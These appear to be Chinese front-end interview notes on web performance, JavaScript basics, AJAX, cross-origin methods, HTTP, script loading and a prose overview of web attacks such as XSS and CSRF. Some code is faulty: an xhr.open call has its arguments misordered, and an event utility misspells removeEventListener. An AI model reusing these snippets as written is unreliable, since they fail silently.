手机）无法完全显示框架9、 多框架的页面会增加服务器的http请求10、 由于上面诸多缺点，因此不符合标准网页设计的理念,已经被标准网页设计抛弃 webSocket 如何兼容低浏览器Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR 线程与进程的区别进程是系统进行资源分配和调度的一个独立单位。线程是进程的一个实体,是CPU调度和分派的基本单位。1、 一个程序至少有一个进程,一个进程至少有一个线程2、 线程的划分尺度小于进程，使得多线程程序的并发性高3、 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率4、 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制5、 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别 如何对网站的文件和资源进行优化1、 文件合并2、 文件最小化/文件压缩3、 使用 CDN 托管4、 缓存的使用（多个域名来提供缓存）雅虎军规：1、尽可能减少http请求次数，将css, js, 图片各自合并2、使用CDN，降低通信距离3、添加Expire/Cache-Control头4、启用Gzip压缩文件5、将css放在页面最上面6、将script放在页面最下面7、避免在css中使用表达式8、将css, js都放在外部文件中9、减少DNS查询10、最小化css, js，减小文件体积11、避免重定向12、移除重复脚本13、配置实体标签ETag14、使用AJAX缓存，让网站内容分批加载，局部更新 三种减少页面加载时间的方法1、 优化图片2、 图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方）3、 优化CSS（压缩合并css，如 margin-top, margin-left…)4、 网址后加斜杠（如www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）5、 标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了）6、 减少http请求（合并文件，合并图片）CSS精灵，将JS代码写在body后面 测试JS代码性能的工具如何测试javascript代码的性能？—知乎1、 浏览器debug中现在都有原生的profile功能，可定位那个函数调用得多，用的时间多，这个可以比较精确定位耗时的函数。2、JSPerf 使用Benchmark.js和jsPerf分析代码性能3、 Dromaeo 前端性能测试：Page Speed OnlineGoogle Page Speed 是当下很流行的在线测试网站性能工具，基于Google的一套最佳的前端性能的规则，你可以很方便得到大量的性能信息，甚至还提供了移动设备的最佳实践报告WebPagetestWebPagetest 是性能测试的黄金标准，它提供了多方面的量化指标用于性能测试，比如有一个基本的评分，用于评价当前页面优化的水平；有一个截图，显示页面加载后的视觉效果；还有一个浏览器加载资源的瀑布流…根据用户浏览器真实的连接速度，在全球范围内进行网页速度测试，并提供详细的优化建议。前端性能测试必备工具清单前端性能优化和测试工具总结推荐10个免费在线测试网页性能工具 什么是 FOUC？ 如何来避免 FOUC？FOUC - Flash Of Unstyled Content 文档样式闪烁使用&lt;style type=&quot;text/css&quot; media=&quot;all&quot;&gt;@import &quot;../fouc.css&quot;;&lt;/style&gt; @import导入外部样式文件时，IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。解决办法：将@import换成link，link是顺序加载，这样页面就会等css下载完之后再下载html文件，这样就先布好了局，所以就不会出现focus闪烁问题。 null和undefined的区别null是一个表示”无”的对象，转为数值时为0undefined是一个表示”无”的原始值，转为数值时为NaN 当声明的变量还未被初始化时，变量的默认值为undefinednull用来表示尚未存在的对象，常用来表示函数企图返回一个不存在的对象 undefined表示 “缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：1、 变量被声明了，但没有赋值时，就等于 undefined2、 调用函数时，应该提供的参数没有提供，该参数等于 undefined3、 对象没有赋值的属性，该属性的值为 undefined4、 函数没有返回值时，默认返回 undefined null表示“没有对象”，即该处不应该有值。典型用法是：1、 作为函数的参数，表示该函数的参数不是对象2、 作为对象原型链的终点 new操作符具体干了什么1、 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型2、 属性和方法被加入到 this 引用的对象中3、 新创建的对象由 this 所引用，并且最后隐式的返回 this //var obj = new Base(); var obj = {}; obj.__proto__ = Base.prototype; Base.call(obj); JSONJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;} json.stringify({a:10,b:20}); //json对象转换成字符串 json.parse(&apos;{&quot;a&quot;:10,&quot;b&quot;:20}&apos;) //字符串转换成json对象 博客—对json的理解 js延迟加载的方式JS延迟加载，也就是等页面加载完成之后再加载 JavaScript 文件。JS延迟加载有助于提高页面加载速度。 defer 属性 async 属性 动态创建DOM方式 使用jQuery的getScript方法 使用setTimeout延迟方法 让JS最后加载 1、 deferHTML 4.01 为 &lt;script&gt;标签定义了 defer属性。用途：表明脚本在执行时不会影响页面的构造。也就是说，脚本会被延迟到整个页面都解析完毕之后再执行。defer属性只适用于外部脚本文件。支持 HTML5 的实现会忽略嵌入脚本设置的 defer属性。2、 asyncHTML5 为 &lt;script&gt;标签定义了 async属性。与defer属性类似，都用于改变处理脚本的行为。同样，只适用于外部脚本文件。目的：不让页面等待脚本下载和执行，从而异步加载页面其他内容。异步脚本一定会在页面 load 事件前执行。不能保证脚本会按顺序执行。3、 动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）4、 按需异步载入js(可以将js文件加载绑定到一个事件上，这样当事件发生时，才会加载相应的js文件)JS延迟加载的几种方式 解决跨域问题1、 通过jsonp跨域 2、 document.domain + iframe跨域 3、 location.hash + iframe 4、 window.name + iframe跨域 5、 postMessage跨域 6、 跨域资源共享（CORS） 7、 nginx代理跨域 8、 nodejs中间件代理跨域 9、 WebSocket协议跨域 前端常见跨域解决方案（全）关于跨域的简单demo集合–github documen.write和 innerHTML 的区别document.write 只能同步执行，如果在window.onload之前执行则在文档流中绘制内容，如果在window.onload之后则会重绘整个页面（之前内容被冲刷掉）innerHTML 则是绘制某个元素内的内容，没有这个限制 .call() 和 .apply() 的作用改变上下文，即this的指向。apply:方法能劫持另外一个对象的方法，继承另外一个对象的属性. Function.apply(obj,args)方法能接收两个参数obj：这个对象将代替Function类里this对象args：这个是数组，它将作为参数传给Function（args–&gt;arguments） call:和apply的意思一样,只不过是参数列表不一样. Function.call(obj,[param1[,param2[,…[,paramN]]]])obj：这个对象将代替Function类里this对象params：这个是一个参数列表 哪些操作会造成内存泄漏内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包 全局变量引起的内存泄漏 循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） dom清空或删除时，事件未清除导致的内存泄漏，脱离 DOM 的引用JavaScript内存泄露的4种方式及如何避免JavaScript常见的内存泄漏原因JavaScript 内存泄漏教程—阮一峰 如何判断当前脚本运行在浏览器还是node环境中通过判断 Global 对象是否为window，如果不为window，当前脚本没有运行在浏览器中。即在node中的全局变量是global ,浏览器的全局变量是window。 可以通过该全局变量是否定义来判断宿主环境。 exports = typeof window === &apos;undefined&apos; ? global : window ; //获取全局对象的方式 //同理可得，typeof window可以用来判断是不是在浏览器环境中 Node.js的优缺点优点： 1、 高并发。采用事件驱动，异步编程，为网络服务而设计。NodeJS能支持比Java、PHP程序更高的并发量，虽然维护事件队列也需要成本，再由于NodeJS是单线程，事件队列越长，得到响应的时间就越长，并发量上还是会力不从心。 2、 适合I/O密集型应用。 node.js非阻塞模式的IO处理给node.js带来在相对较低的资源耗用下的高性能与出众的负载能力,适合处理并发请求。 3、 node.js轻量高效，可以认为是数据密集型实时应用系统的完美解决方案。 4、 js语言适合前端工程师上手。 5、 社区活跃发展速度快缺点： 1、 单线程，单进程，只支持单核CPU，不能充分的利用多核CPU服务器。 2、 对程序员要求高一旦进程崩溃，那么整个web服务器就崩溃了。 解决方案：（1）Nnigx反向代理，负载均衡，开多个进程，绑定多个端口；（2）开多个进程监听同一个端口，使用cluster模块； 3、 不适合做复杂性很高的计算。 4、 不适合CPU密集型应用；CPU密集型应用给Node带来的挑战主要是：由于JavaScript单线程的原因，如果有长时间运行的计算（比如大循环），将会导致CPU时间片不能释放，使得后续I/O无法发起； 5、 开源组件库质量参差不齐，更新快，向下不兼容 6、 Debug不方便，错误没有stack traceNodeJS适合运用在高并发、I/O密集、少量业务逻辑的场景。NodeJS优缺点及适用场景讨论 前端界面工程师 理解及前景 前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。1、 实现界面交互2、 提升用户体验3、 有了Node.js，前端可以实现服务端的一些事情4、 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好5、 参与项目，快速高质量完成实现效果图，精确到1px；6、 与团队成员，UI设计，产品经理的沟通；7、 做好的页面结构，页面重构和用户体验；8、 处理hack，兼容、写出优美的代码格式；9、 针对服务器的优化、拥抱最新前端技术。 http状态码1xx: 信息性状态码，表示服务器接收到请求正在处理。2xx: 成功状态码，表示服务器正确处理完请求。3xx: 重定向状态码，表示请求的资源位置发生改变，需要重新请求。301永久重定向，302临时重定向。4xx: 客户端错误状态码，服务器无法处理该请求。 404 not found5xx: 服务器错误状态码，服务器处理请求出错。 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息200 OK 正常返回信息201 Created 请求成功并且服务器创建了新的资源202 Accepted 服务器已接受请求，但尚未处理301 Moved Permanently 请求的网页已永久移动到新位置302 Found 临时性重定向303 See Other 临时性重定向，且总是使用 GET 请求新的 URI304 Not Modified 自从上次请求后，请求的网页未修改过400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求401 Unauthorized 请求未授权403 Forbidden 禁止访问404 Not Found 找不到如何与 URI 相匹配的资源500 Internal Server Error 最常见的服务器端错误503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护） 页面加载过程1、 当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。(DNS查询方式：浏览器缓存-&gt;系统缓存-&gt;路由器缓存)2、 浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。3、 一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。4、 此时，Web 服务器提供资源服务，客户端开始下载资源。 请求返回后，便进入了我们关注的前端模块浏览器会解析 HTML 生成 DOM Tree，其次会根据 CSS 生成 CSS Rule Tree，而 javascript 又可以根据 DOM API 操作 DOM 如何管理项目1、 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等2、 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）3、 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）4、 页面进行标注（例如 页面 模块 开始和结束）5、 CSS 跟 HTML 分文件夹并行存放，命名都得统一（例如 style.css）6、 JS 分文件夹存放 命名以该 JS 功能为准的英文翻译7、 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理 javascript对象的几种创建方式1、工厂模式2、构造函数模式3、原型模式 javascript继承的 6 种方法1、 原型链继承2、 借用构造函数继承3、 组合继承(原型+借用构造)4、 原型式继承5、 寄生式继承6、 寄生组合式继承JS继承的实现方式 ajax 的过程1、 创建XMLHttpRequest对象,也就是创建一个异步调用对象var xhr = new XMLHttpRequest()2、 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息xhr.open(url,&quot;get&quot;,false);3、 设置响应HTTP请求状态变化的函数onreadyState监听4、 发送HTTP请求如果是post必须发送xhr.send(null);(null不能为空)5、 获取异步调用返回的数据6、 使用JavaScript和DOM实现局部刷新 var xhr=new XMLHttpRequest(); xhr.onreadystatechange=function(){ if(xhr.readyState===4){ if(xhr.status===200){ doResponse(xhr.responseText); } } } xhr.open(&apos;GET&apos;,&apos;URL&apos;,true); xhr.send(null); xhr.open(&apos;POST&apos;,&apos;URL&apos;,true); setRequestHeader(&apos;Content-Type&apos;,&apos;application/x-www-form-urlencoded&apos;); xhr.send(&apos;k=v&amp;k=v&apos;); 异步加载和延迟加载把script标签放在head之间，意味着必须等到全部js代码都被下载，解析，执行完成之后，才开始呈现页面的内容。浏览器在遇到body标签时才开始呈现内容 1、&lt;script&gt;标签定义了defer属性，这个属性的用途表明脚本在执行的时候不会影响页面结构，相当于告诉浏览器立即下载，但延迟执行。注意defer属性只使用于外部脚本文件，支持html5的实现会忽略给嵌入脚本设置的defer属性。因此把延迟脚本放在页面的底部仍是最佳的选择&lt;script type = &quot;text/javascript&quot; defer=&quot;defer&quot; src=&quot;.js&quot;&gt;2、异步脚本async只使用于外部脚本文件，并告诉浏览器立即下载文件，但与defer不同的是，标记为async的脚本并不保证按照指定他们的先后顺序执行。&lt;script type = &quot;text/javascript&quot; async src=&quot;.js&quot;&gt; 前端的安全问题1、XSS指cross-site-scripting, 跨站脚本攻击，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 浅谈XSS攻击的那些事（附常用绕过姿势）2、SQL注入，指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。SQL注入攻击原理以及基本方法3、OS命令注入攻击，指的是通过web应用，执行非法的操作系统命令达到非法攻击的目的。4、HTTP首部注入攻击，指攻击者通过在相应首部字段内插入换行，然后添加任意响应首部过主体的攻击。 邮件首部注入攻击，指攻击者通过向邮件首部to或subject内任意添加非法内容引起的攻击。攻击服务端(4)-HTTP参数注入攻击5、会话劫持，指攻击者通过某种手段拿到了用户的会话id，并非法使用此会话id伪装成用户达到攻击的目的。 6、还有DoS DDoS，一种让运行中的服务成停止状态的攻击。7、CSRF，跨站点请求伪造攻击，指的是攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等 CSRF攻击与防御 ie 各版本和 chrome 可以并行下载多少个资源1、 IE6 2 个并发2、 iE7 升级之后的 6 个并发，之后版本也是 6 个3、 Firefox，chrome 也是6个 js继承怎么实现，如何避免原型链上面的对象共享1、 原型链继承2、 借用构造函数继承3、 组合继承(原型+借用构造)4、 原型式继承5、 寄生式继承6、 寄生组合式继承利用空对象作为中介。Javascript面向对象编程（二）：构造函数的继承 —阮一峰 代码压缩工具及使用方法1、Google Closure Compile2、Yahoo Yui Compresso3、UglifyJSGCC压缩混淆的最彻底，但是破坏原有代码，并且不可压缩CSS文件，运行在java环境下，危险，要严格注意书写规范。Yui可以压缩CSS文件，安全，但是压缩完的文件函数名称没有混淆，压缩混淆的作用小，运行在java环境下。UglifyJs不可以压缩混淆CSS文件，运行在NodeJs环境下，但是压缩完的文件函数名称没有混淆，压缩混淆的作用小，安全JS代码压缩混淆工具使用说明 Flash、Ajax各自的优缺点，在使用中如何取舍Flash：1、 Flash适合处理多媒体、矢量图形、访问机器2、 对CSS、处理文本上不足，不容易被搜索Ajax：1、 Ajax对CSS、文本支持很好，支持搜索2、 多媒体、矢量图形、机器访问不足共同点：1、 与服务器的无刷新传递消息2、 可以检测用户离线和在线状态3、 操作DOM JavaScript 的同源策略概念：同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性，无法访问其它域的资源。同源策略是浏览器为了保护用户的个人信息以及企业数据的安全而设置的一种策略，不同源的客户端脚本是不能在对方未允许的情况下访问或索取对方的数据信息。 为什么要有同源限制：我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。 什么是 “use strict” ? 使用它的好处和坏处ECMAscript 5添加了第二种运行模式：”严格模式”（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。设立”严格模式”的目的，主要有以下几个：1、 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;2、 消除代码运行的一些不安全之处，保证代码运行的安全；3、 提高编译器效率，增加运行速度；4、 为未来新版本的Javascript做好铺垫。注：经过测试 IE6,7,8,9 均不支持严格模式。缺点：现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。 GET和POST的区别GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符POST：一般用于修改服务器上的资源，对所发送的信息没有限制 GET方式需要使用 Request.QueryString 来取得变量的值POST方式通过 Request.Form 来获取变量的值也就是说 Get 是通过地址栏来传值，而 Post 是通过提交表单来传值。 在以下情况中，请使用 POST 请求：1、 无法使用缓存文件（更新服务器上的文件或数据库）2、 向服务器发送大量数据（POST 没有数据量限制）3、 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠 HTTP方法 是根据意图区分的，HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。表面区别：(1)传参方式1、 GET可以通过URL直接传参2、 两者都可以通过body传参(2)长度1、 header和body都没有对长度的限制2、 URL的长度受到部分早期浏览器的限制3、 URL的长度还可能受到服务器的限制，由于URL的实际超长或者设定其Content-Length较大值会引起服务器最大并发数下降或者资源空耗4、 2和3间接限定了URL方式发起GET方法的长度(3)安全性1、 GET不会修改服务端数据，POST可以修改数据2、 URL方式发起GET请求，参数会明文暴露3、 使用GET提交数据还可能会造成Cross-site request forgery攻击4、 本质上安全性无区别 css阻塞，js阻塞js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，比如其他资源的下载，内容的呈现等等。直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。 CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。 嵌入JS应该放在什么位置？1、 放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。2、 如果嵌入JS放在head中，请把嵌入JS放在CSS头部。3、 使用 defer（只支持IE）4、 不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用 Javascript无阻塞加载具体方式：1、 将脚本放在底部。&lt;link&gt;还是放在head中，用以保证在js加载前，能加载出正常显示的页面。&lt;script&gt;标签放在&lt;/body&gt;前。2、 阻塞脚本：由于每个&lt;script&gt;标签下载时阻塞页面解析过程，所以限制页面的&lt;script&gt;总数也可以改善性能。适用于内联脚本和外部脚本。3、 非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 window.onload 事件发出后开始下载代码。4、 defer属性：支持IE4和fierfox3.5更高版本浏览器5、 动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。代码如下： &lt;script&gt; var script=document.createElement(&quot;script&quot;); script.type=&quot;text/javascript&quot;; script.src=&quot;file.js&quot;; document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script); &lt;/script&gt; 此技术的重点在于：无论在何处启动下载，文件下载和运行都不会阻塞其他页面处理过程，即使在head里（除了用于下载文件的 http 链接）关于CSS加载造成阻塞问题css并不会阻塞DOM树的解析，但会阻塞DOM树渲染。css加载会阻塞后面js语句的执行。为了避免让用户看到长时间的白屏时间，我们应该尽可能的提高css加载速度，比如可以使用以下几种方法:1.使用CDN(因为CDN会根据你的网络状况，替你挑选最近的一个具有缓存内容的节点为你提供资源，因此可以减少加载时间)2.对css进行压缩(可以用很多打包工具，比如webpack,gulp等，也可以通过开启gzip压缩)3.合理的使用缓存(设置cache-control,expires,以及E-tag都是不错的，不过要注意一个问题，就是文件更新后，你要避免缓存而带来的影响。其中一个解决防范是在文件名字后面加一个版本号)4.减少http请求数，将多个css文件合并，或者是干脆直接写成内联样式(内联样式的一个缺点就是不能缓存)css加载会造成阻塞吗 eval()1、 它的功能是把对应的字符串解析成JS代码并运行2、 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行） 一个通用的事件侦听器函数// event(事件)工具集，来源：github.com/markyun markyun.Event = { // 页面加载完成后 readyEvent : function(fn) { if (fn==null) { fn=document; } var oldonload = window.onload; if (typeof window.onload != &apos;function&apos;) { window.onload = fn; } else { window.onload = function() { oldonload(); fn(); }; } }, // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent : function(element, type, handler) { if (element.addEventListener) { //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); } else if (element.attachEvent) { element.attachEvent(&apos;on&apos; + type, function() { handler.call(element); }); } else { element[&apos;on&apos; + type] = handler; } }, // 移除事件 removeEvent : function(element, type, handler) { if (element.removeEnentListener) { element.removeEnentListener(type, handler, false); } else if (element.detachEvent) { element.detachEvent(&apos;on&apos; + type, handler); } else { element[&apos;on&apos; + type] = null; } }, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation : function(ev) { if (ev.stopPropagation) { ev.stopPropagation(); } else { ev.cancelBubble = true; } }, // 取消事件的默认行为 preventDefault : function(event) { if (event.preventDefault) { event.preventDefault(); } else { event.returnValue = false; } }, // 获取事件目标 getTarget : function(event) { return event.target || event.srcElement; }, // 获取event对象的引用，取到事件的所有信息，确保随时能使用event； getEvent : function(e) { var ev = e || window.event; if (!ev) { var c = this.getEvent.caller; while (c) { ev = c.arguments[0]; if (ev &amp;&amp; Event == ev.constructor) { break; } c = c.caller; } } return ev; } }; Node.js 的适用场景1、 高并发2、 聊天3、 实时消息推送 1 Web开发：Express + EJS + Mongoose/MySQLexpress 是轻量灵活的Nodejs Web应用框架，它可以快速地搭建网站。Express框架建立在Nodejs内置的Http模块上，并对Http模块再包装，从而实际Web请求处理的功能。ejs是一个嵌入的Javascript模板引擎，通过编译生成HTML的代码。mongoose 是MongoDB的对象模型工具，通过Mongoose框架，可以进行访问MongoDB的操作。mysql 是连接MySQL数据库的通信API，可以进行访问MySQL的操作。通常用Nodejs做Web开发，需要3个框架配合使用，就像Java中的SSH。2 REST开发：Restifyrestify 是一个基于Nodejs的REST应用框架，支持服务器端和客户端。restify比起express更专注于REST服务，去掉了express中的 template, render等功能，同时强化了REST协议使用，版本化支持，HTTP的异常处理。3 Web聊天室(IM)：Express + Socket.iosocket.io一个是基于Nodejs架构体系的，支持websocket的协议用于时时通信的一个软件包。socket.io 给跨浏览器构建实时应用提供了完整的封装，socket.io完全由javascript实现。4 Web爬虫：Cheerio/Requestcheerio 是一个为服务器特别定制的，快速、灵活、封装jQuery核心功能工具包。Cheerio包括了 jQuery核心的子集，从jQuery库中去除了所有DOM不一致性和浏览器不兼容的部分，揭示了它真正优雅的API。Cheerio工作在一个非常简 单，一致的DOM模型之上，解析、操作、渲染都变得难以置信的高效。基础的端到端的基准测试显示Cheerio大约比JSDOM快八倍(8x)。 Cheerio封装了@FB55兼容的htmlparser，几乎能够解析任何的 HTML 和 XML document。5 Web博客：HexoHexo 是一个简单地、轻量地、基于Node的一个静态博客框架。通过Hexo我们可以快速创建自己的博客，仅需要几条命令就可以完成。发布时，Hexo可以部署在自己的Node服务器上面，也可以部署github上面。对于个人用户来说，部署在github上好处颇多，不仅可以省 去服务器的成本，还可以减少各种系统运维的麻烦事(系统管理、备份、网络)。所以，基于github的个人站点，正在开始流行起来….6 Web论坛: nodeclubNode Club 是用 Node.js 和 MongoDB 开发的新型社区软件，界面优雅，功能丰富，小巧迅速， 已在Node.js 中文技术社区 CNode 得到应用，但你完全可以用它搭建自己的社区。7 Web幻灯片：CleaverCleaver 可以生成基于Markdown的演示文稿。如果你已经有了一个Markdown的文档，30秒就可以制作成幻灯片。Cleaver是为Hacker准备的工具。8 前端包管理平台: bower.jsBower 是 twitter 推出的一款包管理工具，基于nodejs的模块化思想，把功能分散到各个模块中，让模块和模块之间存在联系，通过 Bower 来管理模块间的这种联系。9 OAuth认证：PassportPassport项 目是一个基于Nodejs的认证中间件。Passport目的只是为了“登陆认证”，因此，代码干净，易维护，可以方便地集成到其他的应用中。Web应用 一般有2种登陆认证的形式：用户名和密码认证登陆,OAuth认证登陆。Passport可以根据应用程序的特点，配置不同的认证机制。本文将介绍，用户 名和密码的认证登陆。10 定时任务工具: laterLater 是一个基于Nodejs的工具库，用最简单的方式执行定时任务。Later可以运行在Node和浏览器中。11 浏览器环境工具: browserifyBrowserify 的出现可以让Nodejs模块跑在浏览器中，用require()的语法格式来组织前端的代码，加载npm的模块。在浏览器中，调用browserify编译后的代码， JavaScript 原型，原型链 ? 有什么特点？1.什么是原型，原型有什么特点：JavaScript 的每个对象都继承另一个对象，后者称为“原型”（prototype）对象。只有null除外，它没有自己的原型对象。使用原型的好处是：原型对象上的所有属性和方法，都能被对应的构造函数创建的实例对象共享（这就是 JavaScript 继承机制的基本设计），也就是说，不必在构造函数中定义对象实例的信息，而是可以将这些信息直接添加到原型对象中。每一个构造函数都有一个prototype（原型）属性，这个属性就是使用构造函数创建出来的实例对象的原型对象。2.什么是原型链，原型链有什么特点对象的属性和方法，有可能是定义在自身，也有可能是定义在它的原型对象上。由于原型本身也是对象，又有自己的原型，所以形成了一条原型链（prototype chain）。如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性指向的那个对象。而Object.prototype对象的原型就是没有任何属性和方法的null对象，而null对象没有自己的原型。“原型链”的作用是，读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的Object.prototype还是找不到，则返回undefined。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。需要注意的是，一级级向上，在原型链寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。 怎么重构页面页面重构是一种思想，是页面的二次构造（在实现层次）：包括设计稿的重构、过时页面的重构、功能不全页面的重构、代码重构。设计稿的重构：设计师的设计稿可能不是特别符合页面效果，当拿到设计稿时需要通过二次重构和修改达到预期效果。功能不全页面的重构：页面功能不符合用户体验、用户交互。过时页面的重构：使用的是过时的代码和标签，跟不上时代的发展。代码重构：代码质量、SEO优化、页面性能、更好的语义化、浏览器兼容、CSS优化。 WEB应用从服务器主动推送Data到客户端的方式1、AJAX轮询利用XHR，通过setInterval定时发送请求，但会造成数据同步不及时及无效的请求，增加后端处理压力2、基于 AJAX 的长轮询（long-polling）方式在Ajax轮询基础上做的一些改进，在没有更新的时候不再返回空响应，而且把连接保持到有更新的时候，客户端向服务器发送Ajax请求，服务器接到请求后hold住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求，通常把这种实现也叫做comet。3、Server-sent-events(SSE)让服务端可以向客户端流式发送文本消息，在实现上，客户端浏览器中增加EventSource对象，使其能通过事件的方式接收到服务器推送的消息，在服务端，使用长连接的事件流协议，即请求响应时增加新数据流数据格式。适应于后端数据更新频繁且对实时性要求较高而又不需要客户端向服务端通信的场景下。缺点： 只能单向通信，服务器端向客户端推送事件；事件流协议只能传输UTF-8数据，不支持二进制流。4、HTTP Streaming通过iframe和&lt;script&gt;标签完成数据的传输5、TCP 长连接6、HTML5 